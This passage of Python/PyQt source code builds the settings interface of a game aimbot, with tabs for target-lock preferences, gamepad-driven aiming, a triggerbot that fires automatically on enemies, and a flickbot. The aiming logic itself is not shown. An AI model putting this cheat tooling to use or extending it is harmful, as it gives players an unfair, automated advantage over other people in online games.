                border: 1px solid #3e3e3e;
                border-radius: 4px;
                selection-background-color: #007acc;
                outline: none;
            }
            QComboBox QAbstractItemView::item {
                color: #cccccc;
                padding: 8px 12px;
                min-height: 30px;
            }
            QComboBox QAbstractItemView::item:hover {
                background-color: #3e3e3e;
            }
            QComboBox QAbstractItemView::item:selected {
                background-color: #007acc;
            }
        """)
    
        preference_options = [
            ("Closest Target", "closest"),
            ("Most Centered", "centered"),
            ("Largest Target", "largest"),
            ("Highest Confidence", "confidence"),
            ("Lowest Health (if visible)", "health")
        ]
    
        for label, value in preference_options:
            self.target_preference_combo.addItem(label, value)
    
        current_preference = target_lock_config.get('preference', 'closest')
        index = self.target_preference_combo.findData(current_preference)
        if index >= 0:
            self.target_preference_combo.setCurrentIndex(index)
    
        selection_layout.addWidget(self.target_preference_combo)
    
        # Multi-target mode
        self.multi_target_cb = self.create_modern_checkbox(
            "Multi-Target Mode (Track multiple targets)",
            target_lock_config.get('multi_target', False)
        )
        selection_layout.addWidget(self.multi_target_cb)
    
        # Max targets slider (only enabled if multi-target is on)
        self.max_targets_slider = self.create_modern_slider(
            selection_layout,
            "Maximum Simultaneous Targets",
            target_lock_config.get('max_targets', 1),
            1,
            5,
            " targets"
        )
        self.max_targets_slider.setEnabled(self.multi_target_cb.isChecked())
    
        # Connect multi-target checkbox to enable/disable slider
        self.multi_target_cb.stateChanged.connect(
            lambda state: self.max_targets_slider.setEnabled(state == Qt.CheckState.Checked.value)
        )
    
        scroll_layout.addWidget(selection_container)

        # ============= ADVANCED OPTIONS =============
        advanced_group = self.create_settings_group()
        advanced_container = QWidget()
        advanced_layout = QVBoxLayout(advanced_container)
        advanced_layout.setContentsMargins(0, 0, 0, 0)
        advanced_layout.setSpacing(12)
    
        advanced_layout.addWidget(self.create_group_label("Advanced Options"))
    
        # Sticky aim
        self.sticky_aim_cb = self.create_modern_checkbox(
            "Sticky Aim (Slow down when near target)",
            target_lock_config.get('sticky_aim', False)
        )
        advanced_layout.addWidget(self.sticky_aim_cb)
    
        # Target prediction
        self.target_prediction_cb = self.create_modern_checkbox(
            "Enable Target Movement Prediction",
            target_lock_config.get('prediction', True)
        )
        advanced_layout.addWidget(self.target_prediction_cb)
    
        # Ignore downed targets
        self.ignore_downed_cb = self.create_modern_checkbox(
            "Ignore Downed/Eliminated Targets",
            target_lock_config.get('ignore_downed', True)
        )
        advanced_layout.addWidget(self.ignore_downed_cb)
    
        # Target switching cooldown
        switch_cooldown = int(target_lock_config.get('switch_cooldown', 0.2) * 1000)
        self.switch_cooldown_slider = self.create_modern_slider(
            advanced_layout,
            "Target Switch Cooldown",
            switch_cooldown,
            0,
            8000,
            "ms",
            0.001
        )
    
        scroll_layout.addWidget(advanced_container)
    
        # Add some padding at the bottom
        scroll_layout.addSpacing(20)
    
        # Set the scroll content
        scroll_area.setWidget(scroll_content)
    
        # Add scroll area to main layout
        layout.addWidget(scroll_area)

    def create_controller_content(self, layout):
        """Controller settings tab with scroll area"""
        layout.addWidget(self.create_section_title("Controller"))
        layout.addWidget(self.create_section_description("Configure gamepad support for aimbot control"))

        # Create scroll area
        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        scroll_area.setStyleSheet("""
            QScrollArea {
                background-color: transparent;
                border: none;
            }
            QScrollBar:vertical {
                background-color: #2d2d2d;
                width: 12px;
                border-radius: 6px;
            }
            QScrollBar::handle:vertical {
                background-color: #3e3e3e;
                border-radius: 6px;
                min-height: 20px;
            }
            QScrollBar::handle:vertical:hover {
                background-color: #4a4a4a;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
                border: none;
                background: none;
            }
        """)

        # Create container widget for scroll content
        scroll_content = QWidget()
        scroll_content.setStyleSheet("background-color: transparent;")
        scroll_layout = QVBoxLayout(scroll_content)
        scroll_layout.setContentsMargins(0, 0, 12, 0)  # Right margin for scrollbar
        scroll_layout.setSpacing(24)

        # Get current controller config
        controller_config = self.config_data.get('controller', {
            'enabled': False,
            'sensitivity': 1.0,
            'deadzone': 15,
            'vibration': True,
            'trigger_threshold': 50,
            'aim_stick': 'right',
            'activation_button': 'right_trigger',
            'button_mappings': {}
        })

        # Connection Status Group
        status_container = QWidget()
        status_layout = QVBoxLayout(status_container)
        status_layout.setContentsMargins(0, 0, 0, 0)
        status_layout.setSpacing(12)
    
        status_layout.addWidget(self.create_group_label("Controller Status"))
    
        # Status widget
        self.controller_status_widget = QWidget()
        self.controller_status_widget.setStyleSheet("""
            QWidget {
                background-color: #1e1e1e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 12px;
            }
        """)
        status_info_layout = QHBoxLayout(self.controller_status_widget)
    
        # Controller icon and status
        self.controller_icon = QLabel("🎮")
        self.controller_icon.setStyleSheet("font-size: 24px;")
        status_info_layout.addWidget(self.controller_icon)
    
        self.controller_status_label = QLabel("No Controller Connected")
        self.controller_status_label.setStyleSheet("""
            color: #858585;
            font-size: 14px;
            font-weight: 600;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        status_info_layout.addWidget(self.controller_status_label)
        status_info_layout.addStretch()
    
        # Refresh button
        self.refresh_controller_btn = self.create_small_button("Refresh", "#3e3e3e")
        self.refresh_controller_btn.clicked.connect(self.refresh_controller_status)
        status_info_layout.addWidget(self.refresh_controller_btn)
    
        status_layout.addWidget(self.controller_status_widget)
    
        # Enable checkbox
        self.controller_enabled_cb = self.create_modern_checkbox(
            "Enable Controller Support",
            controller_config.get('enabled', False)
        )
        status_layout.addWidget(self.controller_enabled_cb)
    
        scroll_layout.addWidget(status_container)

        # Input Settings Group
        input_container = QWidget()
        input_layout = QVBoxLayout(input_container)
        input_layout.setContentsMargins(0, 0, 0, 0)
        input_layout.setSpacing(20)
    
        input_layout.addWidget(self.create_group_label("Input Configuration"))
    
        # Activation method
        activation_label = QLabel("Activation Method:")
        activation_label.setStyleSheet("""
            color: #cccccc;
            font-size: 13px;
            margin-bottom: 4px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        input_layout.addWidget(activation_label)
    
        self.controller_activation_combo = QComboBox()
        self.controller_activation_combo.setCursor(Qt.CursorShape.PointingHandCursor)
        self.controller_activation_combo.setStyleSheet(self.get_combo_style())
        self.controller_activation_combo.setStyleSheet("""
            QComboBox {
                background-color: #3e3e3e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 8px 12px;
                color: #cccccc;
                font-size: 13px;
                min-width: 200px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QComboBox:hover {
                border-color: #555;
            }
            QComboBox:focus {
                border-color: #007acc;
            }
            QComboBox::drop-down {
                border: none;
                width: 20px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 0;
                height: 0;
                border-left: 4px solid transparent;
                border-right: 4px solid transparent;
                border-top: 5px solid #858585;
                margin-right: 8px;
            }
            QComboBox QAbstractItemView {
                background-color: #2d2d2d;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                selection-background-color: #007acc;
                outline: none;
            }
            QComboBox QAbstractItemView::item {
                color: #cccccc;
                padding: 8px 12px;
                min-height: 30px;
            }
            QComboBox QAbstractItemView::item:hover {
                background-color: #3e3e3e;
            }
            QComboBox QAbstractItemView::item:selected {
                background-color: #007acc;
            }
        """)
    
        activation_options = [
            ("Right Trigger (RT)", "right_trigger"),
            ("Left Trigger (LT)", "left_trigger"),
            ("Right Bumper (RB)", "right_bumper"),
            ("Left Bumper (LB)", "left_bumper"),
            ("Right Stick Click (RS)", "right_stick"),
            ("A Button", "a_button"),
            ("X Button", "x_button"),
        ]
    
        for label, value in activation_options:
            self.controller_activation_combo.addItem(label, value)
    
        current_activation = controller_config.get('activation_button', 'right_trigger')
        index = self.controller_activation_combo.findData(current_activation)
        if index >= 0:
            self.controller_activation_combo.setCurrentIndex(index)
    
        input_layout.addWidget(self.controller_activation_combo)
    
        # Aim stick selector
        aim_stick_label = QLabel("Aim Control Stick:")
        aim_stick_label.setStyleSheet("""
            color: #cccccc;
            font-size: 13px;
            margin-top: 12px;
            margin-bottom: 4px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        input_layout.addWidget(aim_stick_label)
    
        self.aim_stick_combo = QComboBox()
        self.aim_stick_combo.setCursor(Qt.CursorShape.PointingHandCursor)
        self.aim_stick_combo.setStyleSheet(self.get_combo_style())
        self.aim_stick_combo.setStyleSheet("""
            QComboBox {
                background-color: #3e3e3e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 8px 12px;
                color: #cccccc;
                font-size: 13px;
                min-width: 200px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QComboBox:hover {
                border-color: #555;
            }
            QComboBox:focus {
                border-color: #007acc;
            }
            QComboBox::drop-down {
                border: none;
                width: 20px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 0;
                height: 0;
                border-left: 4px solid transparent;
                border-right: 4px solid transparent;
                border-top: 5px solid #858585;
                margin-right: 8px;
            }
            QComboBox QAbstractItemView {
                background-color: #2d2d2d;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                selection-background-color: #007acc;
                outline: none;
            }
            QComboBox QAbstractItemView::item {
                color: #cccccc;
                padding: 8px 12px;
                min-height: 30px;
            }
            QComboBox QAbstractItemView::item:hover {
                background-color: #3e3e3e;
            }
            QComboBox QAbstractItemView::item:selected {
                background-color: #007acc;
            }
        """)
    
        self.aim_stick_combo.addItem("Right Stick", "right")
        self.aim_stick_combo.addItem("Left Stick", "left")
        self.aim_stick_combo.addItem("Both Sticks", "both")
    
        current_stick = controller_config.get('aim_stick', 'right')
        index = self.aim_stick_combo.findData(current_stick)
        if index >= 0:
            self.aim_stick_combo.setCurrentIndex(index)
    
        input_layout.addWidget(self.aim_stick_combo)
    
        # Sensitivity slider
        controller_sens = int(controller_config.get('sensitivity', 1.0) * 10)
        self.controller_sens_slider = self.create_modern_slider(
            input_layout,
            "Controller Sensitivity",
            controller_sens,
            1,
            50,
            "",
            0.1
        )
    
        # Deadzone slider
        deadzone = int(controller_config.get('deadzone', 15))
        self.controller_deadzone_slider = self.create_modern_slider(
            input_layout,
            "Analog Stick Deadzone",
            deadzone,
            5,
            40,
            "%"
        )
    
        # Trigger threshold slider
        trigger_threshold = int(controller_config.get('trigger_threshold', 50))
        self.trigger_threshold_slider = self.create_modern_slider(
            input_layout,
            "Trigger Activation Threshold",
            trigger_threshold,
            10,
            90,
            "%"
        )
    
        scroll_layout.addWidget(input_container)

        # Features Group
        features_container = QWidget()
        features_layout = QVBoxLayout(features_container)
        features_layout.setContentsMargins(0, 0, 0, 0)
        features_layout.setSpacing(12)
    
        features_layout.addWidget(self.create_group_label("Controller Features"))
    
        # Vibration feedback
        self.controller_vibration_cb = self.create_modern_checkbox(
            "Enable Vibration Feedback",
            controller_config.get('vibration', True)
        )
        features_layout.addWidget(self.controller_vibration_cb)
    
        # Auto-switch to controller
        self.controller_autoswitch_cb = self.create_modern_checkbox(
            "Auto-switch to controller when connected",
            controller_config.get('auto_switch', False)
        )
        features_layout.addWidget(self.controller_autoswitch_cb)
    
        # Hold to aim option
        self.controller_hold_aim_cb = self.create_modern_checkbox(
            "Hold button to aim (release to stop)",
            controller_config.get('hold_to_aim', True)
        )
        features_layout.addWidget(self.controller_hold_aim_cb)
    
        scroll_layout.addWidget(features_container)

        # Button Mappings Group
        mappings_container = QWidget()
        mappings_layout = QVBoxLayout(mappings_container)
        mappings_layout.setContentsMargins(0, 0, 0, 0)
        mappings_layout.setSpacing(8)
    
        mappings_layout.addWidget(self.create_group_label("Quick Actions"))
    
        # Create button mapping grid
        mappings_grid = QGridLayout()
        mappings_grid.setSpacing(12)
    
        button_actions = [
            ("Y Button", "y_action", ["None", "Toggle Overlay", "Toggle Debug Window", "Increase Sensitivity", "Decrease Sensitivity"]),
            ("X Button", "x_action", ["None", "Toggle Overlay", "Toggle Debug Window", "Toggle Triggerbot", "Toggle Flickbot"]),
            ("B Button", "b_action", ["None", "Emergency Stop", "Toggle Movement Curves", "Switch Overlay Shape"]),
            ("Back + Start", "combo_action", ["None", "Toggle Aimbot", "Open Menu", "Reset Settings"]),
        ]
    
        self.button_mapping_combos = {}
    
        for i, (button_label, action_key, actions) in enumerate(button_actions):
            label = QLabel(f"{button_label}:")
            label.setStyleSheet("""
                color: #cccccc;
                font-size: 13px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            """)
            mappings_grid.addWidget(label, i, 0)
        
            combo = QComboBox()
            combo.setCursor(Qt.CursorShape.PointingHandCursor)
            combo.setStyleSheet(self.get_combo_style())
            combo.setMinimumWidth(200)
        
            for action in actions:
                combo.addItem(action)
        
            # Set current value
            current_action = controller_config.get('button_mappings', {}).get(action_key, "None")
            index = combo.findText(current_action)
            if index >= 0:
                combo.setCurrentIndex(index)
        
            mappings_grid.addWidget(combo, i, 1)
            self.button_mapping_combos[action_key] = combo
    
        mappings_layout.addLayout(mappings_grid)
        scroll_layout.addWidget(mappings_container)

        # Controller Test Area
        test_container = QWidget()
        test_layout = QVBoxLayout(test_container)
        test_layout.setContentsMargins(0, 0, 0, 0)
        test_layout.setSpacing(12)
    
        test_layout.addWidget(self.create_group_label("Controller Test"))
    
        # Test area widget
        self.controller_test_widget = QWidget()
        self.controller_test_widget.setMinimumHeight(120)
        self.controller_test_widget.setStyleSheet("""
            QWidget {
                background-color: #1e1e1e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 12px;
            }
        """)
    
        test_widget_layout = QVBoxLayout(self.controller_test_widget)
    
        # Input display
        self.controller_input_label = QLabel("Press buttons or move sticks to test")
        self.controller_input_label.setStyleSheet("""
            color: #858585;
            font-size: 12px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace;
        """)
        self.controller_input_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        test_widget_layout.addWidget(self.controller_input_label)
    
        # Stick visualization
        self.stick_visual = QLabel("Left Stick: (0.00, 0.00) | Right Stick: (0.00, 0.00)")
        self.stick_visual.setStyleSheet("""
            color: #007acc;
            font-size: 12px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace;
        """)
        self.stick_visual.setAlignment(Qt.AlignmentFlag.AlignCenter)
        test_widget_layout.addWidget(self.stick_visual)
    
        test_layout.addWidget(self.controller_test_widget)
    
        # Test vibration button
        self.test_vibration_btn = self.create_action_button("Test Vibration", "#4caf50", "#45a049")
        self.test_vibration_btn.clicked.connect(self.test_controller_vibration)
        test_layout.addWidget(self.test_vibration_btn)
    
        scroll_layout.addWidget(test_container)
    
        # Add some padding at the bottom
        scroll_layout.addSpacing(20)

        # Set the scroll content
        scroll_area.setWidget(scroll_content)
    
        # Add scroll area to main layout
        layout.addWidget(scroll_area)

        # Start controller test timer
        self.controller_test_timer = QTimer()
        self.controller_test_timer.timeout.connect(self.update_controller_test)
        self.controller_test_timer.start(50)  # Update every 50ms

    def get_combo_style(self):
        """Get combo box style"""
        return """
            QComboBox {
                background-color: #3e3e3e;
                border: 2px solid #555;
                border-radius: 4px;
                padding: 8px 12px;
                color: #cccccc;
                font-size: 13px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QComboBox:hover {
                border: 2px solid #007acc;
            }
            QComboBox:focus {
                border: 2px solid #00d4ff;
            }
            QComboBox::drop-down {
                border: none;
                width: 20px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 0;
                height: 0;
                border-left: 4px solid transparent;
                border-right: 4px solid transparent;
                border-top: 5px solid #858585;
                margin-right: 8px;
            }
            QComboBox QAbstractItemView {
                background-color: #2d2d2d;
                border: 2px solid #007acc;
                border-radius: 4px;
                selection-background-color: #007acc;
                outline: none;
            }
        """

    def refresh_controller_status(self):
        """Refresh controller connection status"""
        try:
            if hasattr(self.aimbot_controller, 'controller') and self.aimbot_controller.controller:
                # Disable silent mode when user clicks refresh
                self.aimbot_controller.controller.silent_mode = False
            
                # Show messages if this is the first time
                if not self.aimbot_controller.controller.messages_shown:
                    self.aimbot_controller.controller.show_controller_messages()
            
                # Now check for controller
                if self.aimbot_controller.controller.find_controller():
                    if self.aimbot_controller.controller.physical_controller_connected:
                        controller_type = self.aimbot_controller.controller.controller_type
                        controller_index = self.aimbot_controller.controller.physical_controller_index
                    
                        self.controller_status_label.setText(f"Connected: {controller_type.upper()} Controller (Index: {controller_index})")
                        self.controller_status_label.setStyleSheet("""
                            color: #4caf50;
                            font-size: 14px;
                            font-weight: 600;
                            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                        """)
                        self.controller_icon.setStyleSheet("font-size: 24px; color: #4caf50;")
                    else:
                        self.controller_status_label.setText("No Controller Connected")
                        self.controller_status_label.setStyleSheet("""
                            color: #858585;
                            font-size: 14px;
                            font-weight: 600;
                            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                        """)
                        self.controller_icon.setStyleSheet("font-size: 24px; color: #858585;")
                else:
                    self.controller_status_label.setText("No Controller Connected")
                    self.controller_icon.setStyleSheet("font-size: 24px; color: #858585;")
            else:
                self.controller_status_label.setText("Controller System Not Initialized")
                self.controller_icon.setStyleSheet("font-size: 24px; color: #ff9800;")
            
        except Exception as e:
            print(f"[-] Error refreshing controller status: {e}")
            self.controller_status_label.setText("Error detecting controller")

    def test_controller_vibration(self):
        """Test controller vibration"""
        try:
            if hasattr(self.aimbot_controller, 'controller') and self.aimbot_controller.controller:
                # Check if physical controller is connected (updated check)
                if self.aimbot_controller.controller.physical_controller_connected:
                    self.aimbot_controller.controller.vibrate(0.5, 0.5, 0.3)
                    self.status_label.setText("Vibration test sent")
                    self.status_dot.setStyleSheet("color: #4caf50; font-size: 10px;")
                    QTimer.singleShot(1000, self.reset_status_label)
                else:
                    self.status_label.setText("No controller connected")
                    self.status_dot.setStyleSheet("color: #f44336; font-size: 10px;")
                    QTimer.singleShot(1000, self.reset_status_label)
            else:
                self.status_label.setText("Controller not initialized")
                self.status_dot.setStyleSheet("color: #ff9800; font-size: 10px;")
                QTimer.singleShot(1000, self.reset_status_label)
        except Exception as e:
            print(f"[-] Vibration test error: {e}")

    def update_controller_test(self):
        """Update controller test display"""
        if not hasattr(self, 'controller_input_label') or not hasattr(self, 'stick_visual'):
            return
    
        try:
            if hasattr(self.aimbot_controller, 'controller') and self.aimbot_controller.controller:
                if self.aimbot_controller.controller.physical_controller_connected:
                    # Update stick positions
                    left_x, left_y = self.aimbot_controller.controller.get_stick_input("left")
                    right_x, right_y = self.aimbot_controller.controller.get_stick_input("right")
                
                    self.stick_visual.setText(
                        f"Left Stick: ({left_x:+.2f}, {left_y:+.2f}) | "
                        f"Right Stick: ({right_x:+.2f}, {right_y:+.2f})"
                    )
                
                    # Check buttons
                    buttons_pressed = []
                
                    # Check standard buttons
                    button_checks = [
                        ('A', 'a'),
                        ('B', 'b'),
                        ('X', 'x'),
                        ('Y', 'y'),
                        ('LB', 'lb'),
                        ('RB', 'rb'),
                        ('Back', 'back'),
                        ('Start', 'start'),
                        ('LS', 'ls'),
                        ('RS', 'rs')
                    ]
                
                    for display_name, button_key in button_checks:
                        if self.aimbot_controller.controller.is_button_pressed(button_key):
                            buttons_pressed.append(display_name)
                
                    # Check triggers
                    left_trigger = self.aimbot_controller.controller.get_trigger_input("left")
                    right_trigger = self.aimbot_controller.controller.get_trigger_input("right")
                
                    if left_trigger > 0.1:
                        buttons_pressed.append(f"LT({left_trigger:.1f})")
                    if right_trigger > 0.1:
                        buttons_pressed.append(f"RT({right_trigger:.1f})")
                
                    # Update display
                    if buttons_pressed:
                        self.controller_input_label.setText("Pressed: " + ", ".join(buttons_pressed))
                        self.controller_input_label.setStyleSheet("""
                            color: #007acc;
                            font-size: 12px;
                            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace;
                        """)
                    else:
                        self.controller_input_label.setText("Press buttons or move sticks to test")
                        self.controller_input_label.setStyleSheet("""
                            color: #858585;
                            font-size: 12px;
                            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace;
                        """)
                else:
                    # No controller connected
                    self.controller_input_label.setText("No controller connected")
                    self.stick_visual.setText("Left Stick: (-.---, -.---) | Right Stick: (-.---, -.---)")
                
        except Exception as e:
            # Silently handle errors to avoid spam
            pass

    def create_triggerbot_content(self, layout):
        """Triggerbot settings tab"""
        layout.addWidget(self.create_section_title("Triggerbot"))
        layout.addWidget(self.create_section_description("Automatic firing when crosshair is on target"))

        # Get current config
        triggerbot_config = self.config_data.get('triggerbot', {})
        if not isinstance(triggerbot_config, dict):
            triggerbot_config = {
                'enabled': False,
                'confidence': 0.5,
                'fire_delay': 0.05,
                'cooldown': 0.1,
                'require_aimbot_key': False,
                'keybind': 0x02
            }

        # Main settings group
        trigger_group = self.create_settings_group()
        trigger_container = QWidget()
        trigger_layout = QVBoxLayout(trigger_container)
        trigger_layout.setContentsMargins(0, 0, 0, 0)
        trigger_layout.setSpacing(20)
    
        # Enable checkbox
        self.triggerbot_enabled_cb = self.create_modern_checkbox(
            "Enable Triggerbot",
            triggerbot_config.get('enabled', False)
        )
        trigger_layout.addWidget(self.triggerbot_enabled_cb)
    
        # Keybind selector
        trigger_keybind_label = QLabel("Triggerbot Activation Key:")
        trigger_keybind_label.setStyleSheet("""
            color: #cccccc;
            font-size: 13px;
            margin-top: 12px;
            margin-bottom: 4px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        trigger_layout.addWidget(trigger_keybind_label)
    
        self.triggerbot_keybind_combo = QComboBox()
        self.triggerbot_keybind_combo.setCursor(Qt.CursorShape.PointingHandCursor)
        self.triggerbot_keybind_combo.setStyleSheet("""
            QComboBox {
                background-color: #3e3e3e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 8px 12px;
                color: #cccccc;
                font-size: 13px;
                min-width: 200px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QComboBox:hover {
                border-color: #555;
            }
            QComboBox:focus {
                border-color: #007acc;
            }
            QComboBox::drop-down {
                border: none;
                width: 20px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 0;
                height: 0;
                border-left: 4px solid transparent;
                border-right: 4px solid transparent;
                border-top: 5px solid #858585;
                margin-right: 8px;
            }
            QComboBox QAbstractItemView {
                background-color: #2d2d2d;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                selection-background-color: #007acc;
                outline: none;
            }
            QComboBox QAbstractItemView::item {
                color: #cccccc;
                padding: 8px 12px;
                min-height: 30px;
            }
            QComboBox QAbstractItemView::item:hover {
                background-color: #3e3e3e;
            }
            QComboBox QAbstractItemView::item:selected {
                background-color: #007acc;
            }
        """)
    
        # Add keybind options
        trigger_keybind_options = [
            ("Right Mouse Button", 0x02),
            ("Middle Mouse Button", 0x04),
            ("Mouse Button 4", 0x05),
            ("Mouse Button 5", 0x06),
            ("Left Shift", 0xA0),
            ("Left Control", 0xA2),
            ("Left Alt", 0xA4),
            ("Caps Lock", 0x14),
        ]
    
        for label, hex_value in trigger_keybind_options:
            self.triggerbot_keybind_combo.addItem(label, hex_value)
    
        current_trigger_key = triggerbot_config.get('keybind', 0x02)
        index = self.triggerbot_keybind_combo.findData(current_trigger_key)
        if index >= 0:
            self.triggerbot_keybind_combo.setCurrentIndex(index)
    
        trigger_layout.addWidget(self.triggerbot_keybind_combo)
    
        # Confidence threshold
        trigger_confidence = int(triggerbot_config.get('confidence', 0.5) * 100)
        self.triggerbot_confidence_slider = self.create_modern_slider(
            trigger_layout,
            "Trigger Confidence Threshold",
            trigger_confidence,
            10,
            99,
            "%",
            0.01
        )
    
        # Fire delay
        fire_delay = int(triggerbot_config.get('fire_delay', 0.05) * 1000)
        self.triggerbot_delay_slider = self.create_modern_slider(
            trigger_layout,
            "Fire Delay (ms)",
            fire_delay,
            10,
            200,
            "ms",
            0.001
        )
    
        # Cooldown
        cooldown = int(triggerbot_config.get('cooldown', 0.1) * 1000)
        self.triggerbot_cooldown_slider = self.create_modern_slider(
            trigger_layout,
            "Cooldown Between Shots",
            cooldown,
            50,
            500,
            "ms",
            0.001
        )

        # Rapid fire options
        self.triggerbot_rapidfire_cb = self.create_modern_checkbox(
            "Enable Rapid Fire",
            triggerbot_config.get('rapid_fire', True)
        )
        trigger_layout.addWidget(self.triggerbot_rapidfire_cb)

        # Shots per burst
        shots_per_burst = triggerbot_config.get('shots_per_burst', 1)
        self.triggerbot_burst_slider = self.create_modern_slider(
            trigger_layout,
            "Shots per Burst",
            shots_per_burst,
            1,
            5,
            " shots"
        )
    
        layout.addWidget(trigger_container)
    
        # Info box
        info_box = QWidget()
        info_box.setStyleSheet("""
            QWidget {
                background-color: #1e1e1e;
                border: 1px solid #007acc;
                border-radius: 4px;
                padding: 12px;
            }
        """)
        info_layout = QVBoxLayout(info_box)
    
        info_text = QLabel("Triggerbot automatically fires when your crosshair is on an enemy. "
                        "Hold the activation key to enable automatic firing.")
        info_text.setStyleSheet("""
            color: #007acc;
            font-size: 12px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        info_text.setWordWrap(True)
        info_layout.addWidget(info_text)
    
        layout.addWidget(info_box)
        layout.addStretch()

    def create_flickbot_content(self, layout):
        """Flickbot settings tab"""
        layout.addWidget(self.create_section_title("Flickbot"))
        layout.addWidget(self.create_section_description("Quick flick shots to targets"))

        # Get current config
        flickbot_config = self.config_data.get('flickbot', {})
        if not isinstance(flickbot_config, dict):
            flickbot_config = {
                'enabled': False,
                'flick_speed': 0.8,
                'flick_delay': 0.05,
                'cooldown': 1.0,
                'keybind': 0x05,
                'auto_fire': True,
                'return_to_origin': True
            }

        # Main settings group
        flick_group = self.create_settings_group()
        flick_container = QWidget()
        flick_layout = QVBoxLayout(flick_container)
        flick_layout.setContentsMargins(0, 0, 0, 0)
        flick_layout.setSpacing(20)
    
        # Enable checkbox
        self.flickbot_enabled_cb = self.create_modern_checkbox(
            "Enable Flickbot",
            flickbot_config.get('enabled', False)
        )
        flick_layout.addWidget(self.flickbot_enabled_cb)
    
        # Keybind selector
        keybind_label = QLabel("Flickbot Activation Key:")
        keybind_label.setStyleSheet("""
            color: #cccccc;
            font-size: 13px;
            margin-top: 12px;
            margin-bottom: 4px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        """)
        flick_layout.addWidget(keybind_label)
    
        self.flickbot_keybind_combo = QComboBox()
        self.flickbot_keybind_combo.setCursor(Qt.CursorShape.PointingHandCursor)
        self.flickbot_keybind_combo.setStyleSheet("""
            QComboBox {
                background-color: #3e3e3e;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                padding: 8px 12px;
                color: #cccccc;
                font-size: 13px;
                min-width: 200px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            QComboBox:hover {
                border-color: #555;
            }
            QComboBox:focus {
                border-color: #007acc;
            }
            QComboBox::drop-down {
                border: none;
                width: 20px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 0;
                height: 0;
                border-left: 4px solid transparent;
                border-right: 4px solid transparent;
                border-top: 5px solid #858585;
                margin-right: 8px;
            }
            QComboBox QAbstractItemView {
                background-color: #2d2d2d;
                border: 1px solid #3e3e3e;
                border-radius: 4px;
                selection-background-color: #007acc;
                outline: none;
            }
            QComboBox QAbstractItemView::item {
                color: #cccccc;
                padding: 8px 12px;
                min-height: 30px;
            }
            QComboBox QAbstractItemView::item:hover {
                background-color: #3e3e3e;
            }
            QComboBox QAbstractItemView::item:selected {
                background-color: #007acc;
            }
        """)
    
        # Add keybind options
        keybind_options = [
            ("Right Mouse Button", 0x02),
            ("Middle Mouse Button", 0x04),
            ("Mouse Button 4", 0x05),
            ("Mouse Button 5", 0x06),
            ("Left Shift", 0xA0),
            ("Left Control", 0xA2),
            ("Left Alt", 0xA4),
            ("Caps Lock", 0x14),
        ]
    
        for label, hex_value in keybind_options:
            self.flickbot_keybind_combo.addItem(label, hex_value)
    
        current_key = flickbot_config.get('keybind', 0x05)
        index = self.flickbot_keybind_combo.findData(current_key)
        if index >= 0:
            self.flickbot_keybind_combo.setCurrentIndex(index)
    
        flick_layout.addWidget(self.flickbot_keybind_combo)

        # Smooth flick option
        self.flickbot_smooth_cb = self.create_modern_checkbox(
            "Smooth flick movement (slower but more stable)",
            flickbot_config.get('smooth_flick', False)
        )
        flick_layout.addWidget(self.flickbot_smooth_cb)
    
        # Flick speed
        flick_speed = int(flickbot_config.get('flick_speed', 0.8) * 100)
        self.flickbot_speed_slider = self.create_modern_slider(
            flick_layout,
            "Flick Speed",
            flick_speed,
            10,
            150,
            "%",
            0.01
        )
    
        # Flick delay
        flick_delay = int(flickbot_config.get('flick_delay', 0.05) * 1000)
        self.flickbot_delay_slider = self.create_modern_slider(
            flick_layout,
            "Flick Delay (ms)",
            flick_delay,
            10,
            200,
            "ms",
            0.001
        )
    
        # Cooldown
        flick_cooldown = int(flickbot_config.get('cooldown', 1.0) * 1000)
        self.flickbot_cooldown_slider = self.create_modern_slider(
            flick_layout,
            "Cooldown Between Flicks",
            flick_cooldown,
            100,
            3000,
            "ms",
            0.001
        )
    
        # Options
        self.flickbot_autofire_cb = self.create_modern_checkbox(
            "Auto-fire after flick",
